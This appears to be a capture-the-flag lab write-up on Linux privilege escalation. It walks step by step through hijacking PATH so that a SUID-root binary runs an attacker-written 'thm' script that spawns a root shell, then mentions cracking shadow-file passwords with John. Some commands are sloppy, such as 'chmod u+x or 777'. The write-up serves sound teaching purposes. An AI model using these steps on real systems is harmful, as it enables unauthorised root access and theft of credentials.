```
# Login to the system using provided credentials.
# Run following command to see the PATh.
echo $PATH

# As we didn't get any interesting PATH entries like /tmp or /usr/bin at starting of PATH, we searched for writable directories.
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
(We have added “grep -v proc” to get rid of the many results related to running processes.)

# we received odd folder /home/murdoch

# We navigate to that folder and run ls -la to look for file which has SUID bit set.
ls -la
total 32
drwxrwxrwx 2 root root  4096 Oct 22  2021 .
drwxr-xr-x 5 root root  4096 Jun 20  2021 ..
-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py

# To look for root-owned scripts or SUID binaries that invoke other programs without full paths or to find Find the exact command name the script calls we run following command.
cat test

# Above command confirms the binary contains `thm`, so the binary likely will attempt to execute that name.

# Unfortunately, subfolders under /usr are not writable. The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. To achive it simply run
export PATH=/tmp:$PATH

# Now create "thm" executable in it and give permission
echo "/bin/bash" > thm
chmod u+x or 777 thm

# Now visit the directory where "test" exists and run the executable
./test 

# programs invoked from your shell inherit your environment. Some setuid programs reset PATH; the lab is arranged so your `thm` in `/tmp` will be found when the binary calls `thm`. when the SUID program tries to execute `thm`, the kernel resolves `thm` using `PATH` and runs `/tmp/thm`. Because the calling process is SUID-root, `/tmp/thm` executes with effective root privileges and runs `/bin/bash -p`, giving you an interactive root shell.

# Now dearch the flag6.txt using find command and password of required user using shadow file and john tool.
```
